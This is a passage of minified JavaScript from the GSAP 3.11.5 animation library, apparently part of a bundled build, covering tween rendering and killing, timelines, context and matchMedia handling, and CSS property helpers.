      m = u.yoyoEase,
      h = i.parent || we,
      _ = (mt(r) || zg(r) ? xr(r[0]) : "length" in i) ? [r] : yn(r);
    if (
      ((l._targets = _.length
        ? Xd(_)
        : Yu(
            "GSAP target " + r + " not found. https://greensock.com",
            !on.nullTargetWarn
          ) || []),
      (l._ptLookup = []),
      (l._overwrite = d),
      v || f || Al(a) || Al(c))
    ) {
      if (
        ((i = l.vars),
        (y = l.timeline =
          new jt({
            data: "nested",
            defaults: g || {},
            targets: h && "nested" === h.data ? h.vars.targets : _,
          })).kill(),
        (y.parent = y._dp = sr(l)),
        (y._start = 0),
        f || Al(a) || Al(c))
      ) {
        if (((S = _.length), (N = f && Zg(f)), tr(f)))
          for (E in f) ~p1.indexOf(E) && (I || (I = {}), (I[E] = f[E]));
        for (C = 0; C < S; C++)
          ((k = Qu(i, h1)).stagger = 0),
            m && (k.yoyoEase = m),
            I && ji(k, I),
            (P = _[C]),
            (k.duration = +Ds(a, sr(l), C, P, _)),
            (k.delay = (+Ds(c, sr(l), C, P, _) || 0) - l._delay),
            !f &&
              1 === S &&
              k.delay &&
              ((l._delay = c = k.delay), (l._start += c), (k.delay = 0)),
            y.to(P, k, N ? N(C, P, _) : 0),
            (y._ease = re.none);
        y.duration() ? (a = c = 0) : (l.timeline = 0);
      } else if (v) {
        Os(Tn(y.vars.defaults, { ease: "none" })),
          (y._ease = Ei(v.ease || i.ease || "none"));
        var X,
          W,
          $,
          L = 0;
        if (mt(v))
          v.forEach(function (Y) {
            return y.to(_, Y, ">");
          }),
            y.duration();
        else {
          for (E in ((k = {}), v))
            "ease" === E || "easeEach" === E || Tx(E, v[E], k, v.easeEach);
          for (E in k)
            for (
              X = k[E].sort(function (Y, F) {
                return Y.t - F.t;
              }),
                L = 0,
                C = 0;
              C < X.length;
              C++
            )
              (($ = {
                ease: (W = X[C]).e,
                duration: ((W.t - (C ? X[C - 1].t : 0)) / 100) * a,
              })[E] = W.v),
                y.to(_, $, L),
                (L += $.duration);
          y.duration() < a && y.to({}, { duration: a - y.duration() });
        }
      }
      a || l.duration((a = y.duration()));
    } else l.timeline = 0;
    return (
      !0 === d && !Bd && ((jr = sr(l)), we.killTweensOf(_), (jr = 0)),
      Gn(h, sr(l), o),
      i.reversed && l.reverse(),
      i.paused && l.paused(!0),
      (p ||
        (!a &&
          !v &&
          l._start === rt(h._time) &&
          Bt(p) &&
          nx(sr(l)) &&
          "nested" !== h.data)) &&
        ((l._tTime = -fe), l.render(Math.max(0, -c) || 0)),
      T && Qg(sr(l), T),
      l
    );
  }
  Dg(e, t);
  var n = e.prototype;
  return (
    (n.render = function (i, o, s) {
      var f,
        d,
        v,
        g,
        T,
        m,
        h,
        _,
        y,
        l = this._time,
        u = this._tDur,
        a = this._dur,
        c = i < 0,
        p = i > u - fe && !c ? u : i < fe ? 0 : i;
      if (a) {
        if (
          p !== this._tTime ||
          !i ||
          s ||
          (!this._initted && this._tTime) ||
          (this._startAt && this._zTime < 0 !== c)
        ) {
          if (((f = p), (_ = this.timeline), this._repeat)) {
            if (((g = a + this._rDelay), this._repeat < -1 && c))
              return this.totalTime(100 * g + i, o, s);
            if (
              ((f = rt(p % g)),
              p === u
                ? ((v = this._repeat), (f = a))
                : ((v = ~~(p / g)) && v === p / g && ((f = a), v--),
                  f > a && (f = a)),
              (m = this._yoyo && 1 & v) && ((y = this._yEase), (f = a - f)),
              (T = jo(this._tTime, g)),
              f === l && !s && this._initted)
            )
              return (this._tTime = p), this;
            v !== T &&
              (_ && this._yEase && a1(_, m),
              this.vars.repeatRefresh &&
                !m &&
                !this._lock &&
                ((this._lock = s = 1),
                (this.render(rt(g * v), !0).invalidate()._lock = 0)));
          }
          if (!this._initted) {
            if (Gg(this, c ? i : f, s, o, p)) return (this._tTime = 0), this;
            if (l !== this._time) return this;
            if (a !== this._dur) return this.render(i, o, s);
          }
          if (
            ((this._tTime = p),
            (this._time = f),
            !this._act && this._ts && ((this._act = 1), (this._lazy = 0)),
            (this.ratio = h = (y || this._ease)(f / a)),
            this._from && (this.ratio = h = 1 - h),
            f && !l && !o && !v && (xn(this, "onStart"), this._tTime !== p))
          )
            return this;
          for (d = this._pt; d; ) d.r(h, d.d), (d = d._next);
          (_ &&
            _.render(
              i < 0 ? i : !f && m ? -fe : _._dur * _._ease(f / this._dur),
              o,
              s
            )) ||
            (this._startAt && (this._zTime = i)),
            this._onUpdate &&
              !o &&
              (c && _f(this, i, o, s), xn(this, "onUpdate")),
            this._repeat &&
              v !== T &&
              this.vars.onRepeat &&
              !o &&
              this.parent &&
              xn(this, "onRepeat"),
            (p === this._tDur || !p) &&
              this._tTime === p &&
              (c && !this._onUpdate && _f(this, i, !0, !0),
              (i || !a) &&
                ((p === this._tDur && this._ts > 0) || (!p && this._ts < 0)) &&
                ei(this, 1),
              !o &&
                (!c || l) &&
                (p || l || m) &&
                (xn(this, p === u ? "onComplete" : "onReverseComplete", !0),
                this._prom &&
                  !(p < u && this.timeScale() > 0) &&
                  this._prom()));
        }
      } else ix(this, i, o, s);
      return this;
    }),
    (n.targets = function () {
      return this._targets;
    }),
    (n.invalidate = function (i) {
      return (
        (!i || !this.vars.runBackwards) && (this._startAt = 0),
        (this._pt = this._op = this._onUpdate = this._lazy = this.ratio = 0),
        (this._ptLookup = []),
        this.timeline && this.timeline.invalidate(i),
        t.prototype.invalidate.call(this, i)
      );
    }),
    (n.resetTo = function (i, o, s, l) {
      ll || en.wake(), this._ts || this.play();
      var a,
        u = Math.min(this._dur, (this._dp._time - this._start) * this._ts);
      return (
        this._initted || Gd(this, u),
        (a = this._ease(u / this._dur)),
        kx(this, i, o, s, l, a, u)
          ? this.resetTo(i, o, s, l)
          : (ka(this, 0),
            this.parent ||
              Yg(
                this._dp,
                this,
                "_first",
                "_last",
                this._dp._sort ? "_start" : 0
              ),
            this.render(0))
      );
    }),
    (n.kill = function (i, o) {
      if ((void 0 === o && (o = "all"), !(i || (o && "all" !== o))))
        return (this._lazy = this._pt = 0), this.parent ? ms(this) : this;
      if (this.timeline) {
        var s = this.timeline.totalDuration();
        return (
          this.timeline.killTweensOf(i, o, jr && !0 !== jr.vars.overwrite)
            ._first || ms(this),
          this.parent &&
            s !== this.timeline.totalDuration() &&
            Io(this, (this._dur * this.timeline._tDur) / s, 0, 1),
          this
        );
      }
      var p,
        f,
        d,
        v,
        g,
        T,
        m,
        l = this._targets,
        u = i ? yn(i) : l,
        a = this._ptLookup,
        c = this._pt;
      if ((!o || "all" === o) && ex(l, u))
        return "all" === o && (this._pt = 0), ms(this);
      for (
        p = this._op = this._op || [],
          "all" !== o &&
            (Je(o) &&
              ((g = {}),
              Vt(o, function (h) {
                return (g[h] = 1);
              }),
              (o = g)),
            (o = Cx(l, o))),
          m = l.length;
        m--;

      )
        if (~u.indexOf(l[m]))
          for (g in ((f = a[m]),
          "all" === o
            ? ((p[m] = o), (v = f), (d = {}))
            : ((d = p[m] = p[m] || {}), (v = o)),
          v))
            (T = f && f[g]) &&
              ((!("kill" in T.d) || !0 === T.d.kill(g)) && wa(this, T, "_pt"),
              delete f[g]),
              "all" !== d && (d[g] = 1);
      return this._initted && !this._pt && c && ms(this), this;
    }),
    (e.to = function (i, o) {
      return new e(i, o, arguments[2]);
    }),
    (e.from = function (i, o) {
      return Rs(1, arguments);
    }),
    (e.delayedCall = function (i, o, s, l) {
      return new e(o, 0, {
        immediateRender: !1,
        lazy: !1,
        overwrite: !1,
        delay: i,
        onComplete: o,
        onReverseComplete: o,
        onCompleteParams: s,
        onReverseCompleteParams: s,
        callbackScope: l,
      });
    }),
    (e.fromTo = function (i, o, s) {
      return Rs(2, arguments);
    }),
    (e.set = function (i, o) {
      return (o.duration = 0), o.repeatDelay || (o.repeat = 0), new e(i, o);
    }),
    (e.killTweensOf = function (i, o, s) {
      return we.killTweensOf(i, o, s);
    }),
    e
  );
})(Fo);
Tn(Ve.prototype, { _targets: [], _lazy: 0, _startAt: 0, _op: 0, _onInit: 0 }),
  Vt("staggerTo,staggerFrom,staggerFromTo", function (t) {
    Ve[t] = function () {
      var e = new jt(),
        n = yf.call(arguments, 0);
      return n.splice("staggerFromTo" === t ? 5 : 4, 0, 0), e[t].apply(e, n);
    };
  });
var Kd = function (e, n, r) {
    return (e[n] = r);
  },
  m1 = function (e, n, r) {
    return e[n](r);
  },
  Ex = function (e, n, r, i) {
    return e[n](i.fp, r);
  },
  Px = function (e, n, r) {
    return e.setAttribute(n, r);
  },
  qd = function (e, n) {
    return Pe(e[n]) ? m1 : Vd(e[n]) && e.setAttribute ? Px : Kd;
  },
  g1 = function (e, n) {
    return n.set(n.t, n.p, Math.round(1e6 * (n.s + n.c * e)) / 1e6, n);
  },
  Nx = function (e, n) {
    return n.set(n.t, n.p, !!(n.s + n.c * e), n);
  },
  _1 = function (e, n) {
    var r = n._pt,
      i = "";
    if (!e && n.b) i = n.b;
    else if (1 === e && n.e) i = n.e;
    else {
      for (; r; )
        (i =
          r.p +
          (r.m ? r.m(r.s + r.c * e) : Math.round(1e4 * (r.s + r.c * e)) / 1e4) +
          i),
          (r = r._next);
      i += n.c;
    }
    n.set(n.t, n.p, i, n);
  },
  Zd = function (e, n) {
    for (var r = n._pt; r; ) r.r(e, r.d), (r = r._next);
  },
  Mx = function (e, n, r, i) {
    for (var s, o = this._pt; o; )
      (s = o._next), o.p === i && o.modifier(e, n, r), (o = s);
  },
  Ox = function (e) {
    for (var r, i, n = this._pt; n; )
      (i = n._next),
        (n.p === e && !n.op) || n.op === e
          ? wa(this, n, "_pt")
          : n.dep || (r = 1),
        (n = i);
    return !r;
  },
  Rx = function (e, n, r, i) {
    i.mSet(e, n, i.m.call(i.tween, r, i.mt), i);
  },
  v1 = function (e) {
    for (var r, i, o, s, n = e._pt; n; ) {
      for (r = n._next, i = o; i && i.pr > n.pr; ) i = i._next;
      (n._prev = i ? i._prev : s) ? (n._prev._next = n) : (o = n),
        (n._next = i) ? (i._prev = n) : (s = n),
        (n = r);
    }
    e._pt = o;
  },
  Ht = (function () {
    function t(n, r, i, o, s, l, u, a, c) {
      (this.t = r),
        (this.s = o),
        (this.c = s),
        (this.p = i),
        (this.r = l || g1),
        (this.d = u || this),
        (this.set = a || Kd),
        (this.pr = c || 0),
        (this._next = n),
        n && (n._prev = this);
    }
    return (
      (t.prototype.modifier = function (r, i, o) {
        (this.mSet = this.mSet || this.set),
          (this.set = Rx),
          (this.m = r),
          (this.mt = o),
          (this.tween = i);
      }),
      t
    );
  })();
Vt(
  Yd +
    "parent,duration,ease,delay,overwrite,runBackwards,startAt,yoyo,immediateRender,repeat,repeatDelay,data,paused,reversed,lazy,callbackScope,stringFilter,id,yoyoEase,stagger,inherit,repeatRefresh,keyframes,autoRevert,scrollTrigger",
  function (t) {
    return (Wd[t] = 1);
  }
),
  (ln.TweenMax = ln.TweenLite = Ve),
  (ln.TimelineLite = ln.TimelineMax = jt),
  (we = new jt({
    sortChildren: !1,
    defaults: zo,
    autoRemoveChildren: !0,
    id: "root",
    smoothChildTiming: !0,
  })),
  (on.stringFilter = l1);
var Uo = [],
  fu = {},
  Dx = [],
  Dh = 0,
  sc = function (e) {
    return (fu[e] || Dx).map(function (n) {
      return n();
    });
  },
  kf = function () {
    var e = Date.now(),
      n = [];
    e - Dh > 2 &&
      (sc("matchMediaInit"),
      Uo.forEach(function (r) {
        var s,
          l,
          u,
          a,
          i = r.queries,
          o = r.conditions;
        for (l in i)
          (s = pn.matchMedia(i[l]).matches) && (u = 1),
            s !== o[l] && ((o[l] = s), (a = 1));
        a && (r.revert(), u && n.push(r));
      }),
      sc("matchMediaRevert"),
      n.forEach(function (r) {
        return r.onMatch(r);
      }),
      (Dh = e),
      sc("matchMedia"));
  },
  y1 = (function () {
    function t(n, r) {
      (this.selector = r && xf(r)),
        (this.data = []),
        (this._r = []),
        (this.isReverted = !1),
        n && this.add(n);
    }
    var e = t.prototype;
    return (
      (e.add = function (r, i, o) {
        Pe(r) && ((o = i), (i = r), (r = Pe));
        var s = this,
          l = function () {
            var p,
              a = Ae,
              c = s.selector;
            return (
              a && a !== s && a.data.push(s),
              o && (s.selector = xf(o)),
              (Ae = s),
              (p = i.apply(s, arguments)),
              Pe(p) && s._r.push(p),
              (Ae = a),
              (s.selector = c),
              (s.isReverted = !1),
              p
            );
          };
        return (s.last = l), r === Pe ? l(s) : r ? (s[r] = l) : l;
      }),
      (e.ignore = function (r) {
        var i = Ae;
        (Ae = null), r(this), (Ae = i);
      }),
      (e.getTweens = function () {
        var r = [];
        return (
          this.data.forEach(function (i) {
            return i instanceof t
              ? r.push.apply(r, i.getTweens())
              : i instanceof Ve &&
                  !(i.parent && "nested" === i.parent.data) &&
                  r.push(i);
          }),
          r
        );
      }),
      (e.clear = function () {
        this._r.length = this.data.length = 0;
      }),
      (e.kill = function (r, i) {
        var o = this;
        if (r) {
          var s = this.getTweens();
          this.data.forEach(function (u) {
            "isFlip" === u.data &&
              (u.revert(),
              u.getChildren(!0, !0, !1).forEach(function (a) {
                return s.splice(s.indexOf(a), 1);
              }));
          }),
            s
              .map(function (u) {
                return { g: u.globalTime(0), t: u };
              })
              .sort(function (u, a) {
                return a.g - u.g || -1;
              })
              .forEach(function (u) {
                return u.t.revert(r);
              }),
            this.data.forEach(function (u) {
              return !(u instanceof Fo) && u.revert && u.revert(r);
            }),
            this._r.forEach(function (u) {
              return u(r, o);
            }),
            (this.isReverted = !0);
        } else
          this.data.forEach(function (u) {
            return u.kill && u.kill();
          });
        if ((this.clear(), i)) {
          var l = Uo.indexOf(this);
          ~l && Uo.splice(l, 1);
        }
      }),
      (e.revert = function (r) {
        this.kill(r || {});
      }),
      t
    );
  })(),
  Lx = (function () {
    function t(n) {
      (this.contexts = []), (this.scope = n);
    }
    var e = t.prototype;
    return (
      (e.add = function (r, i, o) {
        tr(r) || (r = { matches: r });
        var u,
          a,
          c,
          s = new y1(0, o || this.scope),
          l = (s.conditions = {});
        for (a in (this.contexts.push(s),
        (i = s.add("onMatch", i)),
        (s.queries = r),
        r))
          "all" === a
            ? (c = 1)
            : (u = pn.matchMedia(r[a])) &&
              (Uo.indexOf(s) < 0 && Uo.push(s),
              (l[a] = u.matches) && (c = 1),
              u.addListener
                ? u.addListener(kf)
                : u.addEventListener("change", kf));
        return c && i(s), this;
      }),
      (e.revert = function (r) {
        this.kill(r || {});
      }),
      (e.kill = function (r) {
        this.contexts.forEach(function (i) {
          return i.kill(r, !0);
        });
      }),
      t
    );
  })(),
  Ku = {
    registerPlugin: function () {
      for (var e = arguments.length, n = new Array(e), r = 0; r < e; r++)
        n[r] = arguments[r];
      n.forEach(function (i) {
        return i1(i);
      });
    },
    timeline: function (e) {
      return new jt(e);
    },
    getTweensOf: function (e, n) {
      return we.getTweensOf(e, n);
    },
    getProperty: function (e, n, r, i) {
      Je(e) && (e = yn(e)[0]);
      var o = Ci(e || {}).get,
        s = r ? Wg : $g;
      return (
        "native" === r && (r = ""),
        e &&
          (n
            ? s(((Zt[n] && Zt[n].get) || o)(e, n, r, i))
            : function (l, u, a) {
                return s(((Zt[l] && Zt[l].get) || o)(e, l, u, a));
              })
      );
    },
    quickSetter: function (e, n, r) {
      if ((e = yn(e)).length > 1) {
        var i = e.map(function (c) {
            return $t.quickSetter(c, n, r);
          }),
          o = i.length;
        return function (c) {
          for (var p = o; p--; ) i[p](c);
        };
      }
      e = e[0] || {};
      var s = Zt[n],
        l = Ci(e),
        u = (l.harness && (l.harness.aliases || {})[n]) || n,
        a = s
          ? function (c) {
              var p = new s();
              (po._pt = 0),
                p.init(e, r ? c + r : c, po, 0, [e]),
                p.render(1, p),
                po._pt && Zd(1, po);
            }
          : l.set(e, u);
      return s
        ? a
        : function (c) {
            return a(e, u, r ? c + r : c, l, 1);
          };
    },
    quickTo: function (e, n, r) {
      var i,
        o = $t.to(
          e,
          ji((((i = {})[n] = "+=0.1"), (i.paused = !0), i), r || {})
        ),
        s = function (u, a, c) {
          return o.resetTo(n, u, a, c);
        };
      return (s.tween = o), s;
    },
    isTweening: function (e) {
      return we.getTweensOf(e, !0).length > 0;
    },
    defaults: function (e) {
      return e && e.ease && (e.ease = Ei(e.ease, zo.ease)), Ph(zo, e || {});
    },
    config: function (e) {
      return Ph(on, e || {});
    },
    registerEffect: function (e) {
      var n = e.name,
        r = e.effect,
        i = e.plugins,
        o = e.defaults,
        s = e.extendTimeline;
      (i || "").split(",").forEach(function (l) {
        return (
          l && !Zt[l] && !ln[l] && Yu(n + " effect requires " + l + " plugin.")
        );
      }),
        (nc[n] = function (l, u, a) {
          return r(yn(l), Tn(u || {}, o), a);
        }),
        s &&
          (jt.prototype[n] = function (l, u, a) {
            return this.add(nc[n](l, tr(u) ? u : (a = u) && {}, this), a);
          });
    },
    registerEase: function (e, n) {
      re[e] = Ei(n);
    },
    parseEase: function (e, n) {
      return arguments.length ? Ei(e, n) : re;
    },
    getById: function (e) {
      return we.getById(e);
    },
    exportRoot: function (e, n) {
      void 0 === e && (e = {});
      var i,
        o,
        r = new jt(e);
      for (
        r.smoothChildTiming = Bt(e.smoothChildTiming),
          we.remove(r),
          r._dp = 0,
          r._time = r._tTime = we._time,
          i = we._first;
        i;

      )
        (o = i._next),
          (n ||
            !(
              !i._dur &&
              i instanceof Ve &&
              i.vars.onComplete === i._targets[0]
            )) &&
            Gn(r, i, i._start - i._delay),
          (i = o);
      return Gn(we, r, 0), r;
    },
    context: function (e, n) {
      return e ? new y1(e, n) : Ae;
    },
    matchMedia: function (e) {
      return new Lx(e);
    },
    matchMediaRefresh: function () {
      return (
        Uo.forEach(function (e) {
          var r,
            i,
            n = e.conditions;
          for (i in n) n[i] && ((n[i] = !1), (r = 1));
          r && e.revert();
        }) || kf()
      );
    },
    addEventListener: function (e, n) {
      var r = fu[e] || (fu[e] = []);
      ~r.indexOf(n) || r.push(n);
    },
    removeEventListener: function (e, n) {
      var r = fu[e],
        i = r && r.indexOf(n);
      i >= 0 && r.splice(i, 1);
    },
    utils: {
      wrap: dx,
      wrapYoyo: px,
      distribute: Zg,
      random: e1,
      snap: Jg,
      normalize: fx,
      getUnit: pt,
      clamp: lx,
      splitColor: o1,
      toArray: yn,
      selector: xf,
      mapRange: n1,
      pipe: ax,
      unitize: cx,
      interpolate: hx,
      shuffle: qg,
    },
    install: Ug,
    effects: nc,
    ticker: en,
    updateRoot: jt.updateRoot,
    plugins: Zt,
    globalTimeline: we,
    core: {
      PropTween: Ht,
      globals: Bg,
      Tween: Ve,
      Timeline: jt,
      Animation: Fo,
      getCache: Ci,
      _removeLinkedListItem: wa,
      reverting: function () {
        return ht;
      },
      context: function (e) {
        return e && Ae && (Ae.data.push(e), (e._ctx = Ae)), Ae;
      },
      suppressOverwrites: function (e) {
        return (Bd = e);
      },
    },
  };
Vt("to,from,fromTo,delayedCall,set,killTweensOf", function (t) {
  return (Ku[t] = Ve[t]);
}),
  en.add(jt.updateRoot),
  (po = Ku.to({}, { duration: 0 }));
var zx = function (e, n) {
    for (var r = e._pt; r && r.p !== n && r.op !== n && r.fp !== n; )
      r = r._next;
    return r;
  },
  jx = function (e, n) {
    var i,
      o,
      s,
      r = e._targets;
    for (i in n)
      for (o = r.length; o--; )
        (s = e._ptLookup[o][i]) &&
          (s = s.d) &&
          (s._pt && (s = zx(s, i)),
          s && s.modifier && s.modifier(n[i], e, r[o], i));
  },
  lc = function (e, n) {
    return {
      name: e,
      rawVars: 1,
      init: function (i, o, s) {
        s._onInit = function (l) {
          var u, a;
          if (
            (Je(o) &&
              ((u = {}),
              Vt(o, function (c) {
                return (u[c] = 1);
              }),
              (o = u)),
            n)
          ) {
            for (a in ((u = {}), o)) u[a] = n(o[a]);
            o = u;
          }
          jx(l, o);
        };
      },
    };
  },
  $t =
    Ku.registerPlugin(
      {
        name: "attr",
        init: function (e, n, r, i, o) {
          var s, l, u;
          for (s in ((this.tween = r), n))
            (u = e.getAttribute(s) || ""),
              ((l = this.add(
                e,
                "setAttribute",
                (u || 0) + "",
                n[s],
                i,
                o,
                0,
                0,
                s
              )).op = s),
              (l.b = u),
              this._props.push(s);
        },
        render: function (e, n) {
          for (var r = n._pt; r; )
            ht ? r.set(r.t, r.p, r.b, r) : r.r(e, r.d), (r = r._next);
        },
      },
      {
        name: "endArray",
        init: function (e, n) {
          for (var r = n.length; r--; )
            this.add(e, r, e[r] || 0, n[r], 0, 0, 0, 0, 0, 1);
        },
      },
      lc("roundProps", wf),
      lc("modifiers"),
      lc("snap", Jg)
    ) || Ku;
(Ve.version = jt.version = $t.version = "3.11.5"),
  (Fg = 1),
  Hd() && Ao(),
  re.Power0,
  re.Power1,
  re.Power2,
  re.Power3,
  re.Power4,
  re.Linear,
  re.Quad,
  re.Cubic,
  re.Quart,
  re.Quint,
  re.Strong,
  re.Elastic,
  re.Back,
  re.SteppedEase,
  re.Bounce,
  re.Sine,
  re.Expo,
  re.Circ;
var Lh,
  Ir,
  ko,
  Jd,
  xi,
  zh,
  ep,
  C1,
  Ix = function () {
    return typeof window < "u";
  },
  wr = {},
  mi = 180 / Math.PI,
  Co = Math.PI / 180,
  Qi = Math.atan2,
  jh = 1e8,
  tp = /([A-Z])/g,
  Ax = /(left|right|width|margin|padding|x)/i,
  Fx = /[\s,\(]\S/,
  Kn = {
    autoAlpha: "opacity,visibility",
    scale: "scaleX,scaleY",
    alpha: "opacity",
  },
  Cf = function (e, n) {
    return n.set(n.t, n.p, Math.round(1e4 * (n.s + n.c * e)) / 1e4 + n.u, n);
  },
  Ux = function (e, n) {
    return n.set(
      n.t,
      n.p,
      1 === e ? n.e : Math.round(1e4 * (n.s + n.c * e)) / 1e4 + n.u,
      n
    );
  },
  Bx = function (e, n) {
    return n.set(
      n.t,
      n.p,
      e ? Math.round(1e4 * (n.s + n.c * e)) / 1e4 + n.u : n.b,
      n
    );
  },
  Vx = function (e, n) {
    var r = n.s + n.c * e;
    n.set(n.t, n.p, ~~(r + (r < 0 ? -0.5 : 0.5)) + n.u, n);
  },
  x1 = function (e, n) {
    return n.set(n.t, n.p, e ? n.e : n.b, n);
  },
  w1 = function (e, n) {
    return n.set(n.t, n.p, 1 !== e ? n.b : n.e, n);
  },
  Hx = function (e, n, r) {
    return (e.style[n] = r);
  },
  bx = function (e, n, r) {
    return e.style.setProperty(n, r);
  },
  $x = function (e, n, r) {
    return (e._gsap[n] = r);
  },
  Wx = function (e, n, r) {
    return (e._gsap.scaleX = e._gsap.scaleY = r);
  },
  Yx = function (e, n, r, i, o) {
    var s = e._gsap;
    (s.scaleX = s.scaleY = r), s.renderTransform(o, s);
  },
  Xx = function (e, n, r, i, o) {
    var s = e._gsap;
    (s[n] = r), s.renderTransform(o, s);
  },
  Se = "transform",
  Un = Se + "Origin",
  Qx = function t(e, n) {
    var r = this,
      i = this.target,
      o = i.style;
    if (e in wr) {
      if (((this.tfm = this.tfm || {}), "transform" === e))
        return Kn.transform.split(",").forEach(function (s) {
          return t.call(r, s, n);
        });
      if (
        (~(e = Kn[e] || e).indexOf(",")
          ? e.split(",").forEach(function (s) {
              return (r.tfm[s] = ur(i, s));
            })
          : (this.tfm[e] = i._gsap.x ? i._gsap[e] : ur(i, e)),
        this.props.indexOf(Se) >= 0)
      )
        return;
      i._gsap.svg &&
        ((this.svgo = i.getAttribute("data-svg-origin")),
        this.props.push(Un, n, "")),
        (e = Se);
    }
    (o || n) && this.props.push(e, n, o[e]);
  },
  S1 = function (e) {
    e.translate &&
      (e.removeProperty("translate"),
      e.removeProperty("scale"),
      e.removeProperty("rotate"));
  },
  Gx = function () {
    var o,
      s,
      e = this.props,
      n = this.target,
      r = n.style,
      i = n._gsap;
    for (o = 0; o < e.length; o += 3)
      e[o + 1]
        ? (n[e[o]] = e[o + 2])
        : e[o + 2]
        ? (r[e[o]] = e[o + 2])
        : r.removeProperty(
            "--" === e[o].substr(0, 2)
              ? e[o]
              : e[o].replace(tp, "-$1").toLowerCase()
          );
    if (this.tfm) {
      for (s in this.tfm) i[s] = this.tfm[s];
      i.svg &&
        (i.renderTransform(),
        n.setAttribute("data-svg-origin", this.svgo || "")),
        (!(o = ep()) || !o.isStart) && !r[Se] && (S1(r), (i.uncache = 1));
    }
  },
  k1 = function (e, n) {
    var r = { target: e, props: [], revert: Gx, save: Qx };
    return (
      e._gsap || $t.core.getCache(e),
      n &&
        n.split(",").forEach(function (i) {
          return r.save(i);
        }),
      r
    );
  },
  Tf = function (e, n) {
    var r = Ir.createElementNS
      ? Ir.createElementNS(
          (n || "http://www.w3.org/1999/xhtml").replace(/^https/, "http"),
          e
        )
      : Ir.createElement(e);
    return r.style ? r : Ir.createElement(e);
  },
  Jn = function t(e, n, r) {
    var i = getComputedStyle(e);
    return (
      i[n] ||
      i.getPropertyValue(n.replace(tp, "-$1").toLowerCase()) ||
      i.getPropertyValue(n) ||
      (!r && t(e, Bo(n) || n, 1)) ||
      ""
    );
  },
  Ih = "O,Moz,ms,Ms,Webkit".split(","),
  Bo = function (e, n, r) {
    var o = (n || xi).style,
      s = 5;
    if (e in o && !r) return e;
    for (
      e = e.charAt(0).toUpperCase() + e.substr(1);
      s-- && !(Ih[s] + e in o);

    );
    return s < 0 ? null : (3 === s ? "ms" : s >= 0 ? Ih[s] : "") + e;
  },
  Ef = function () {
    Ix() &&
      window.document &&
      ((Lh = window),
      (Ir = Lh.document),
      (ko = Ir.documentElement),
      (xi = Tf("div") || { style: {} }),
      Tf("div"),
      (Se = Bo(Se)),
      (Un = Se + "Origin"),
      (xi.style.cssText =
        "border-width:0;line-height:0;position:absolute;padding:0"),
      (C1 = !!Bo("perspective")),
      (ep = $t.core.reverting),
      (Jd = 1));
  },
  uc = function t(e) {
    var s,
      n = Tf(
        "svg",
        (this.ownerSVGElement && this.ownerSVGElement.getAttribute("xmlns")) ||
          "http://www.w3.org/2000/svg"
      ),
      r = this.parentNode,
      i = this.nextSibling,
      o = this.style.cssText;
    if (
      (ko.appendChild(n),
      n.appendChild(this),
      (this.style.display = "block"),
      e)
    )
      try {
        (s = this.getBBox()),
          (this._gsapBBox = this.getBBox),
          (this.getBBox = t);
      } catch {}
    else this._gsapBBox && (s = this._gsapBBox());
    return (
      r && (i ? r.insertBefore(this, i) : r.appendChild(this)),
      ko.removeChild(n),
      (this.style.cssText = o),
      s
    );
  },
  Ah = function (e, n) {
    for (var r = n.length; r--; )
      if (e.hasAttribute(n[r])) return e.getAttribute(n[r]);
  },
  T1 = function (e) {
    var n;
    try {
      n = e.getBBox();
    } catch {
      n = uc.call(e, !0);
    }
    return (
      (n && (n.width || n.height)) || e.getBBox === uc || (n = uc.call(e, !0)),
      !n || n.width || n.x || n.y
        ? n
        : {
            x: +Ah(e, ["x", "cx", "x1"]) || 0,
            y: +Ah(e, ["y", "cy", "y1"]) || 0,
            width: 0,
            height: 0,
          }
    );
  },
  E1 = function (e) {
    return !(!e.getCTM || (e.parentNode && !e.ownerSVGElement) || !T1(e));
  },
  ul = function (e, n) {
    if (n) {
      var r = e.style;
      n in wr && n !== Un && (n = Se),
        r.removeProperty
          ? (("ms" === n.substr(0, 2) || "webkit" === n.substr(0, 6)) &&
              (n = "-" + n),
            r.removeProperty(n.replace(tp, "-$1").toLowerCase()))
          : r.removeAttribute(n);
    }
  },
  Ar = function (e, n, r, i, o, s) {
    var l = new Ht(e._pt, n, r, 0, 1, s ? w1 : x1);
    return (e._pt = l), (l.b = i), (l.e = o), e._props.push(r), l;
  },
  Fh = { deg: 1, rad: 1, turn: 1 },
  Kx = { grid: 1, flex: 1 },
  ti = function t(e, n, r, i) {
    var v,
      g,
      T,
      m,
      o = parseFloat(r) || 0,
      s = (r + "").trim().substr((o + "").length) || "px",
      l = xi.style,
      u = Ax.test(n),
      a = "svg" === e.tagName.toLowerCase(),
      c = (a ? "client" : "offset") + (u ? "Width" : "Height"),
      p = 100,
      f = "px" === i,
      d = "%" === i;
    return i === s || !o || Fh[i] || Fh[s]
      ? o
      : ("px" !== s && !f && (o = t(e, n, r, "px")),
        (m = e.getCTM && E1(e)),
        (!d && "%" !== s) || (!wr[n] && !~n.indexOf("adius"))
          ? ((l[u ? "width" : "height"] = p + (f ? s : i)),
            (g =
              ~n.indexOf("adius") || ("em" === i && e.appendChild && !a)
                ? e
                : e.parentNode),
            m && (g = (e.ownerSVGElement || {}).parentNode),
            (!g || g === Ir || !g.appendChild) && (g = Ir.body),
            (T = g._gsap) &&
            d &&
            T.width &&
            u &&
            T.time === en.time &&
            !T.uncache
              ? De((o / T.width) * p)
              : ((d || "%" === s) &&
                  !Kx[Jn(g, "display")] &&
                  (l.position = Jn(e, "position")),
                g === e && (l.position = "static"),
                g.appendChild(xi),
                (v = xi[c]),
                g.removeChild(xi),
                (l.position = "absolute"),
                u && d && (((T = Ci(g)).time = en.time), (T.width = g[c])),
                De(f ? (v * o) / p : v && o ? (p / v) * o : 0)))
          : ((v = m ? e.getBBox()[u ? "width" : "height"] : e[c]),
            De(d ? (o / v) * p : (o / 100) * v)));
  },
  ur = function (e, n, r, i) {
    var o;
    return (
      Jd || Ef(),
      n in Kn &&
        "transform" !== n &&
        ~(n = Kn[n]).indexOf(",") &&
        (n = n.split(",")[0]),
      wr[n] && "transform" !== n
        ? ((o = cl(e, i)),
          (o =
            "transformOrigin" !== n
              ? o[n]
              : o.svg
              ? o.origin
              : Zu(Jn(e, Un)) + " " + o.zOrigin + "px"))
        : (!(o = e.style[n]) ||
            "auto" === o ||
            i ||
            ~(o + "").indexOf("calc(")) &&
          (o =
            (qu[n] && qu[n](e, n, r)) ||
            Jn(e, n) ||
            Hg(e, n) ||
            ("opacity" === n ? 1 : 0)),
      r && !~(o + "").trim().indexOf(" ") ? ti(e, n, o, r) + r : o
    );
  },
  qx = function (e, n, r, i) {
